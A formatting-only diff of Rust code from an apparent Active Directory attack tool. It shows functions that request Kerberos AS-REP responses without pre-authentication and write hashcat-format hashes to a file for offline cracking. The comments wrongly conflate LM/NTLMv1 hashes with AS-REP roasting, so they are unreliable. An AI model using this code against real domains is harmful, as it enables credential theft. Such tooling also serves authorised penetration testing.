@@ -288,10 +288,7 @@ pub async fn run_ntlmv1_roast(
 /// - Domain functional level (2000/2003 more likely to allow NTLMv1)
 /// - DC operating system version
 /// - Presence of users with LM hashes stored
-async fn test_ntlmv1_downgrade(
-    hunt_config: &HuntConfig,
-    _test_user: &str,
-) -> Result<bool> {
+async fn test_ntlmv1_downgrade(hunt_config: &HuntConfig, _test_user: &str) -> Result<bool> {
     info!("    Testing NTLMv1 downgrade via LDAP enumeration...");
 
     // Connect to LDAP
@@ -347,10 +344,7 @@ async fn test_ntlmv1_downgrade(
 /// Note: Full NTLMv1 extraction requires low-level protocol manipulation
 /// that goes beyond standard Kerberos AS-REQ. This is a detection framework
 /// that identifies downgrade opportunities.
-async fn extract_ntlmv1_hash(
-    hunt_config: &HuntConfig,
-    username: &str,
-) -> Result<NtlmV1Hash> {
+async fn extract_ntlmv1_hash(hunt_config: &HuntConfig, username: &str) -> Result<NtlmV1Hash> {
     // NTLMv1 extraction in the context of AS-REP roasting works as follows:
     // 1. AS-REP roasting gets the TGT encrypted with the user's NTLM hash
     // 2. If the domain allows NTLMv1, the user may have an LM hash stored
@@ -366,10 +360,7 @@ async fn extract_ntlmv1_hash(
     // Generate hashcat format
     let hashcat_hash = format!(
         "$krb5asrep$23${}@{}:{}:{}",
-        username,
-        hunt_config.domain,
-        asrep_data.etype,
-        asrep_data.enc_part
+        username, hunt_config.domain, asrep_data.etype, asrep_data.enc_part
     );
 
     // Note: True LM hash extraction requires NTLM session setup, not AS-REP.
@@ -391,10 +382,7 @@ struct AsrepData {
     enc_part: String,
 }
 
-async fn request_asrep_ntlm_hash(
-    hunt_config: &HuntConfig,
-    username: &str,
-) -> Result<AsrepData> {
+async fn request_asrep_ntlm_hash(hunt_config: &HuntConfig, username: &str) -> Result<AsrepData> {
     use overthrone_core::proto::kerberos;
 
     // Request AS-REP without pre-authentication
@@ -429,23 +417,28 @@ fn write_hashes_to_file(result: &NtlmV1RoastResult, output_file: &str) -> Result
     use std::io::Write;
 
     let mut file = File::create(output_file).map_err(|e| {
-        OverthroneError::custom(format!("Failed to create output file {}: {}", output_file, e))
+        OverthroneError::custom(format!(
+            "Failed to create output file {}: {}",
+            output_file, e
+        ))
     })?;
 
     // Write NTLMv1 hashes
     for hash in &result.ntlmv1_hashes {
-        writeln!(file, "{}", hash.hashcat_hash).map_err(|e| {
-            OverthroneError::custom(format!("Failed to write hash to file: {}", e))
-        })?;
+        writeln!(file, "{}", hash.hashcat_hash)
+            .map_err(|e| OverthroneError::custom(format!("Failed to write hash to file: {}", e)))?;
     }
 
     // Write NTLMv2-only hashes
     for username in &result.ntlmv2_only {
         // These would be standard AS-REP hashes
         // In practice, they'd be extracted by the asreproast module
-        writeln!(file, "# NTLMv2-only user: {} (use standard AS-REP roast)", username).map_err(
-            |e| OverthroneError::custom(format!("Failed to write comment to file: {}", e)),
-        )?;
+        writeln!(
+            file,
+            "# NTLMv2-only user: {} (use standard AS-REP roast)",
+            username
+        )
+        .map_err(|e| OverthroneError::custom(format!("Failed to write comment to file: {}", e)))?;
     }
 
     Ok(())
